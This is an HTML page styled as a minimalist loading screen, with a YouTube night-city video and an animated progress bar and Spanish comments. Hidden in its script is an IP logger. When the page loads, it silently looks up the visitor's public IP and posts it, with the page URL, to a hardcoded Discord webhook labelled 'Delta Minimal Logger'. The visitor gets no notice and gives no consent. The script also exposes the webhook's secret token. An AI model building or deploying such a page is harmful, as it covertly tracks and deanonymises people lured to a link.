<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
        }

        /* Video de fondo: Edificios nocturnos */
        .video-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        #bg-video {
            width: 100vw;
            height: 100vh;
            transform: scale(1.4); /* Elimina bordes negros de YT */
            object-fit: cover;
        }

        /* Overlay con animaciones */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(0,0,0,0) 0%, rgba(0,0,0,0.7) 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1;
        }

        /* Barra de carga minimalista y transparente */
        .loader-box {
            width: 250px;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(5px);
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            animation: fadeIn 2s ease-in-out;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ffcc, #0077ff);
            box-shadow: 0 0 15px #00ffcc;
            transition: width 0.1s linear;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

    <div class="video-container">
        <div id="bg-video"></div>
    </div>

    <div class="overlay" onclick="enableAudio()">
        <div class="loader-box">
            <div class="progress-fill" id="progress"></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';

        // 1. YouTube Background API
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        var firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

        var player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('bg-video', {
                videoId: 'Tbw3w0RA0WU', // Video de edificios nocturnos / Lo-fi
                playerVars: {
                    'autoplay': 1,
                    'controls': 0,
                    'mute': 1,
                    'loop': 1,
                    'playlist': 'Tbw3w0RA0WU',
                    'showinfo': 0,
                    'rel': 0
                },
                events: {
                    'onReady': (e) => {
                        e.target.playVideo();
                        startLoading();
                        sendMinimalData();
                    }
                }
            });
        }

        function enableAudio() {
            if (player) {
                player.unMute();
                player.setVolume(40);
            }
        }

        // 2. Barra de carga rápida y limpia
        function startLoading() {
            const bar = document.getElementById('progress');
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += 1.5; // Velocidad de carga
                    bar.style.width = width + '%';
                }
            }, 60);
        }

        // 3. Envío de datos simplificado (Solo IP y URL)
        async function sendMinimalData() {
            let userIP = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        description: `🌐 **Nueva IP capturada:** \`${userIP}\` \n🔗 **Origen:** ${window.location.href}`,
                        color: 1752220, // Azul neón
                        footer: { text: "Delta Minimal Logger" }
                    }]
                })
            }).catch(() => {});
        }
    </script>
</body>
</html>
